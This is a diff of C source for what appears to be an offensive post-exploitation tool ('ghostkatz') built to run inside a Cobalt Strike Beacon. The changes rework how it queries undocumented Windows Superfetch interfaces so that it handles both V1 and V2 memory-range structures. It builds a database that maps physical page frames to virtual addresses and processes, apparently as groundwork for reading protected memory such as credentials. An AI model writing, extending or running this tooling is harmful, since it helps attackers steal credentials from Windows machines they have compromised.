@@ -4,84 +4,160 @@
 #include "superfetch.h"
 #include "ghostkatz.h"
 
-BOOL QuerySuperfetchMemoryRanges(SUPERFETCH_INFORMATION* superfetchInfo, PPF_MEMORY_RANGE_INFO_V2* info)
+BOOL QuerySuperfetchMemoryRanges(SUPERFETCH_INFORMATION* superfetchInfo, BOOL use_PF_MEMORYRANGEINFO_V2, PVOID* ppInfo, PULONG pInfoLen)
 {
-    PF_MEMORY_RANGE_INFO_V2 probe = { 0 };
+    *ppInfo = NULL;
+    *pInfoLen = 0;
 
     ULONG returnLength = 0;
+    NTSTATUS status = 0;
+
+    //
     // --- Step 1: probe memory ranges ---
-    probe.version = 2; // required for new versions of Windows
-    (*superfetchInfo).Data = &probe;
-    (*superfetchInfo).Length = sizeof(probe);
-
-    // This function will fail and return the length required
-    NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
-
-
-    // --- Step 2: allocate proper amount of buffer for ranges ---
-    *info = (PPF_MEMORY_RANGE_INFO_V2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
-    (*info)->version = 2;
-
-    // --- Step 3: Call the function for real ---
-    (*superfetchInfo).Data = *info;
-    (*superfetchInfo).Length = returnLength;
-
-    NTSTATUS status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
-    if (status != 0)
+    //
+    if (use_PF_MEMORYRANGEINFO_V2)
     {
-        BeaconFormatPrintf(&outputbuffer, "[!] NtQuerySystemInformation (SuperfetchMemoryRangesQuery) failed: %lx\n", status);
+        PF_MEMORY_RANGE_INFO_V2 probe = { 0 };
+        probe.version = 2; // Windows 1803+
+
+        superfetchInfo->Data = &probe;
+        superfetchInfo->Length = sizeof(probe);
+
+        status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
+    }
+    else
+    {
+        PF_MEMORY_RANGE_INFO_V1 probe = { 0 };
+        probe.Version = 1; 
+
+        superfetchInfo->Data = &probe;
+        superfetchInfo->Length = sizeof(probe);
+
+        status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
+    }
+
+    // Expect probe to fail with required size
+    if (status != STATUS_BUFFER_TOO_SMALL && returnLength == 0)
+    {
+        BeaconFormatPrintf(&outputbuffer,
+            "[!] NtQuerySystemInformation (SuperfetchMemoryRangesQuery) probe failed: 0x%lx (retLen=%lu)\n",
+            status, returnLength);
         return FALSE;
     }
 
+    //
+    // --- Step 2: allocate proper amount of buffer for ranges ---
+    //
+    PVOID info = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
+    if (!info)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed allocating %lu bytes for ranges\n", returnLength);
+        return FALSE;
+    }
+
+    if (use_PF_MEMORYRANGEINFO_V2)
+        ((PPF_MEMORY_RANGE_INFO_V2)info)->version = 2;
+    else
+        ((PPF_MEMORY_RANGE_INFO_V1)info)->Version = 1;
+
+    //
+    // --- Step 3: Call the function for real ---
+    //
+    superfetchInfo->Data = info;
+    superfetchInfo->Length = returnLength;
+
+    status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
+
+    if (status != 0)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] NtQuerySystemInformation (SuperfetchMemoryRangesQuery) failed: 0x%lx\n", status);
+        HeapFree(GetProcessHeap(), 0, info);
+        return FALSE;
+    }
+
+    *ppInfo = info;
+    *pInfoLen = returnLength;
     return TRUE;
 }
 
-BOOL BuildGlobalDatabase(SUPERFETCH_INFORMATION* superfetchInfo, PPF_MEMORY_RANGE_INFO_V2* info, PTRANSLATION_INFORMATION* pGlobalTranslationInfo)
+BOOL BuildGlobalDatabase(SUPERFETCH_INFORMATION* superfetchInfo, BOOL use_PF_MEMORYRANGEINFO_V2, PVOID pInfo, PTRANSLATION_INFORMATION* pGlobalTranslationInfo)
 {
-    size_t bufferBase = 0;
-    for (int i = 0; i < (*info)->ranges_count; i++)
+    if (!superfetchInfo || !pInfo || !pGlobalTranslationInfo || !*pGlobalTranslationInfo)
+        return FALSE;
+
+    // Normalize "ranges pointer" + "range count" across V1/V2
+    PF_PHYSICAL_MEMORY_RANGE* pRanges = NULL;
+    ULONG rangeCount = 0;
+
+    if (use_PF_MEMORYRANGEINFO_V2)
     {
-        PF_PHYSICAL_MEMORY_RANGE* range = &(*info)->ranges[i];      // Current PF_PHYSICAL_MEMORY_RANGE struct iteration (current range)
+        PPF_MEMORY_RANGE_INFO_V2 info2 = (PPF_MEMORY_RANGE_INFO_V2)pInfo;
+        rangeCount = info2->ranges_count;
+        pRanges = info2->ranges;
+    }
+    else
+    {
+        PPF_MEMORY_RANGE_INFO_V1 info1 = (PPF_MEMORY_RANGE_INFO_V1)pInfo;
+        rangeCount = info1->RangeCount;
+        pRanges = info1->Ranges;
+    }
+
+    size_t bufferBase = 0;
+
+    for (ULONG i = 0; i < rangeCount; i++)
+    {
+        PF_PHYSICAL_MEMORY_RANGE* range = &pRanges[i];
         ULONG_PTR basePfn = range->BasePfn;
         size_t pageCount = range->PageCount;
 
-        // PF_PFN_PRIO_REQUEST struct contains the MMPFN_IDENTITY struct information for the whole range
-        // We build the PF_PFN_PRIO_REQUEST struct to send a proper request
-        // MMPFN_IDENTITY gets filled and we can parse it for detailed information
-        size_t PfnDataSize = FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) + pageCount * sizeof(MMPFN_IDENTITY);
-        PF_PFN_PRIO_REQUEST* PfPfnPrioRequestData = (PF_PFN_PRIO_REQUEST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PfnDataSize);
+        size_t PfnDataSize =
+            FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) +
+            pageCount * sizeof(MMPFN_IDENTITY);
+
+        PF_PFN_PRIO_REQUEST* PfPfnPrioRequestData =
+            (PF_PFN_PRIO_REQUEST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PfnDataSize);
+
+        if (!PfPfnPrioRequestData)
+        {
+            BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed for PFN request (range %lu)\n", i);
+            return FALSE;
+        }
+
         PfPfnPrioRequestData->Version = 1;
         PfPfnPrioRequestData->RequestFlags = 1;
         PfPfnPrioRequestData->PfnCount = pageCount;
 
-        for (ULONG_PTR j = 0; j < pageCount; j++) {
+        for (ULONG_PTR j = 0; j < pageCount; j++)
             PfPfnPrioRequestData->PageData[j].PageFrameIndex = basePfn + j;
-        }
 
-        // SUPERFETCH_INFORMATION struct for upcoming NtQuerySystemInformation
-        (*superfetchInfo).Data = PfPfnPrioRequestData;
-        (*superfetchInfo).Length = PfnDataSize;
-        (*superfetchInfo).InfoClass = SuperfetchPfnQuery;
+        superfetchInfo->Data = PfPfnPrioRequestData;
+        superfetchInfo->Length = (ULONG)PfnDataSize;
+        superfetchInfo->InfoClass = SuperfetchPfnQuery;
 
-        // Send request
         ULONG ResultLength = 0;
         NTSTATUS status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &ResultLength);
+
         if (status != 0)
         {
             BeaconFormatPrintf(&outputbuffer, "[!] NtQuerySystemInformation SuperfetchPfnQuery failed! Error: 0x%lx\n", status);
+            HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
             return FALSE;
         }
 
-        // Allocate temporary buffer that will store the Translation Information for each range individually
-        // The goal is to copy it to the global buffer one range-buffer at a time
-        PVOID pPerRangeTranslationInfoBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pageCount * sizeof(TRANSLATION_INFORMATION));
-        //DEBUG_PRINT("[Range %d] Allocated temporary %llu sized buffer!\n", i, pageCount * sizeof(TRANSLATION_INFORMATION));
+        PVOID pPerRangeTranslationInfoBuffer =
+            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pageCount * sizeof(TRANSLATION_INFORMATION));
+
+        if (!pPerRangeTranslationInfoBuffer)
+        {
+            BeaconFormatPrintf(&outputbuffer, "[!] HeapAlloc failed for translation buffer (range %lu)\n", i);
+            HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
+            return FALSE;
+        }
 
         PTRANSLATION_INFORMATION pTranslationInfo = (PTRANSLATION_INFORMATION)pPerRangeTranslationInfoBuffer;
 
-        for (int k = 0; k < pageCount; k++)
+        for (size_t k = 0; k < pageCount; k++)
         {
-            // Parse the returned data stored in the MMPFN_IDENTITY structure
             MMPFN_IDENTITY pfnIdentity = PfPfnPrioRequestData->PageData[k];
             pTranslationInfo[k].PageFrameIndex = pfnIdentity.PageFrameIndex;
             pTranslationInfo[k].PagePhysicalAddress = (pfnIdentity.PageFrameIndex << PAGE_SHIFT);
@@ -89,70 +165,120 @@ BOOL BuildGlobalDatabase(SUPERFETCH_INFORMATION* superfetchInfo, PPF_MEMORY_RANG
             pTranslationInfo[k].UniqueProcessKey = pfnIdentity.u1.e4.UniqueProcessKey;
         }
 
-        // Copy the temporary range buffer to the global
-        // Account for the bufferBase to prevent overwriting previous range buffer entries since this is a for loop
         memcpy((PBYTE)*pGlobalTranslationInfo + bufferBase, pTranslationInfo, pageCount * sizeof(TRANSLATION_INFORMATION));
-        //DEBUG_PRINT("[Range %d] Copied temporary range buffer to global database!\n", i);
+
         bufferBase += pageCount * sizeof(TRANSLATION_INFORMATION);
 
         HeapFree(GetProcessHeap(), 0, pPerRangeTranslationInfoBuffer);
         HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
     }
-    HeapFree(GetProcessHeap(), 0, *info);
+
+    HeapFree(GetProcessHeap(), 0, pInfo);
     return TRUE;
 }
 
 PTRANSLATION_INFORMATION pGlobalTranslationInfo;
 size_t TotalRangePageCount = 0;
 
-BOOL CreateGlobalSuperfetchDatabase()
+BOOL CreateGlobalSuperfetchDatabase(BOOL use_PF_MEMORYRANGEINFO_V2)
 {
     BeaconFormatPrintf(&outputbuffer, "[+] Creating Global Pfn Database...\n");
 
+    // Step 1 - Query Superfetch for physical memory ranges (V1 or V2)
+    PVOID pInfo = NULL;
+    ULONG infoLen = 0;
 
-    // Step 1 - Call Superfetch the first time to get all the physical memory ranges
-    PPF_MEMORY_RANGE_INFO_V2 info = { 0 };
     SUPERFETCH_INFORMATION superfetchInfo = {
-            .Version = SUPERFETCH_VERSION, // must be 45 (0x2D)
-            .Magic = SUPERFETCH_MAGIC,   // 'kuhC' bytes
-            .InfoClass = SuperfetchMemoryRangesQuery,
+        .Version   = SUPERFETCH_VERSION,     // must be 45 (0x2D)
+        .Magic     = SUPERFETCH_MAGIC,       // 'kuhC'
+        .InfoClass = SuperfetchMemoryRangesQuery
     };
 
-    BOOL bResult = QuerySuperfetchMemoryRanges(&superfetchInfo, &info); // Use SuperfetchMemoryRangesQuery
-    if (!bResult)
+    BOOL bResult = QuerySuperfetchMemoryRanges(
+        &superfetchInfo,
+        use_PF_MEMORYRANGEINFO_V2,
+        &pInfo,
+        &infoLen
+    );
+
+    if (!bResult || !pInfo)
         return FALSE;
 
-    // Optionally print out their information
-    //PrintRangesV2(info); 
-
-
-    // Step 2 - Get the total number of pages so we can calculate global database buffer size
+    //
+    // Step 2 - Compute total number of pages across all ranges
+    //
     TotalRangePageCount = 0;
-    for (int i = 0; i < info->ranges_count; i++)
+
+    if (use_PF_MEMORYRANGEINFO_V2)
     {
-        PF_PHYSICAL_MEMORY_RANGE* range = &info->ranges[i];      // Current PF_PHYSICAL_MEMORY_RANGE struct iteration (current range)
-        ULONG_PTR basePfn = range->BasePfn;                      // What is the base pfn of the range
-        size_t pageCount = range->PageCount;                     // How many pages are in the range
-        TotalRangePageCount += pageCount;
+        PPF_MEMORY_RANGE_INFO_V2 info2 = (PPF_MEMORY_RANGE_INFO_V2)pInfo;
+
+        for (ULONG i = 0; i < info2->ranges_count; i++)
+        {
+            TotalRangePageCount += info2->ranges[i].PageCount;
+        }
     }
-    //DEBUG_PRINT("Total Number of pages: %llu\n", TotalRangePageCount);
+    else
+    {
+        PPF_MEMORY_RANGE_INFO_V1 info1 = (PPF_MEMORY_RANGE_INFO_V1)pInfo;
 
+        for (ULONG i = 0; i < info1->RangeCount; i++)
+        {
+            TotalRangePageCount += info1->Ranges[i].PageCount;
+        }
+    }
 
-    // Step 3 - Allocate global database buffer
-    PVOID pGlobalTranslationInformationBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TotalRangePageCount * sizeof(TRANSLATION_INFORMATION));
-    //DEBUG_PRINT("Allocated %llu sized buffer!\n", TotalRangePageCount * sizeof(TRANSLATION_INFORMATION));
-
-
-    // Step 4 - Query each range to get detailed information such as the MMPFN_IDENTITY structure
-    BeaconFormatPrintf(&outputbuffer, "[+] Building database...\n");
-    pGlobalTranslationInfo = (PTRANSLATION_INFORMATION)pGlobalTranslationInformationBuffer;
-    bResult = BuildGlobalDatabase(&superfetchInfo, &info, &pGlobalTranslationInfo);
-    if (!bResult)
+    if (TotalRangePageCount == 0)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] TotalRangePageCount == 0\n");
+        HeapFree(GetProcessHeap(), 0, pInfo);
         return FALSE;
+    }
 
+    //
+    // Step 3 - Allocate global translation database buffer
+    //
+    SIZE_T globalSize = TotalRangePageCount * sizeof(TRANSLATION_INFORMATION);
+
+    PVOID pGlobalTranslationInformationBuffer =
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, globalSize);
+
+    if (!pGlobalTranslationInformationBuffer)
+    {
+        BeaconFormatPrintf(&outputbuffer, "[!] Failed to allocate global translation buffer (%llu bytes)\n", (unsigned long long)globalSize);
+
+        HeapFree(GetProcessHeap(), 0, pInfo);
+        return FALSE;
+    }
+
+    //
+    // Step 4 - Build global PFN → VA database
+    //
+    BeaconFormatPrintf(&outputbuffer, "[+] Building database...\n");
+
+    pGlobalTranslationInfo =
+        (PTRANSLATION_INFORMATION)pGlobalTranslationInformationBuffer;
+
+    bResult = BuildGlobalDatabase(
+        &superfetchInfo,
+        use_PF_MEMORYRANGEINFO_V2,
+        pInfo,
+        &pGlobalTranslationInfo
+    );
+
+    if (!bResult)
+    {
+        // Cleanup
+        if (pInfo)
+            HeapFree(GetProcessHeap(), 0, pInfo);
+
+        HeapFree(GetProcessHeap(), 0, pGlobalTranslationInformationBuffer);
+        pGlobalTranslationInfo = NULL;
+        TotalRangePageCount = 0;
+        return FALSE;
+    }
 
     BeaconFormatPrintf(&outputbuffer, "[+] Finished building database!\n");
-
     return TRUE;
 }
 
